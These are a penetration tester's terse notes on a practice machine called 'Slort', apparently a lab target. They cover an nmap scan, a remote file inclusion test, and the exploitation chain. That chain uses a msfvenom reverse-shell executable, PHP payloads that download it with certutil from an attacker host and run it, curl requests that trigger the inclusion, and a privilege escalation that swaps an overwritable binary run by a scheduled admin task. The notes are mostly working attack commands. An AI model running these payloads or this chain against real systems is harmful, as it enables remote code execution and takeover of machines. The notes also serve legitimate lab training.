# Slort
# date 20/08/2023
# ip 192.168.172.53

rfi in web server >> made rev.exe and php files to download and execute exe file >> a backup scheduler running as admin and it is over writable >> got admin 

# nmap
PORT     STATE SERVICE       REASON  VERSION
21/tcp   open  ftp           syn-ack FileZilla ftpd 0.9.41 beta
135/tcp  open  msrpc         syn-ack Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds? syn-ack
3306/tcp open  mysql?        syn-ack
4443/tcp open  http          syn-ack Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
8080/tcp open  http          syn-ack Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)


# enum 
lfi
curl http://192.168.172.53:4443/site/index.php?page=http://192.168.45.190/hi 
nc -lvnp 80

# exploitation
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.190 LPORT=4443 -f exe > reverse.exe 



step1.php

<?php 
$exec = system('certutil.exe -urlcache -split -f "http://192.168.49.68/reverse.exe" shell.exe', $val); 
?> 


step2.php

<?php 
$exec = system('shell.exe', $val); 
?> 


curl http://192.168.172.53:4443/site/index.php?page=http://192.168.45.190/step1.php
curl http://192.168.172.53:4443/site/index.php?page=http://192.168.45.190/step2.php



# priv esc
PS C:\Backup> cat info.txt

PS C:\Backup> move TFTP.EXE TFTP_old.EXE            
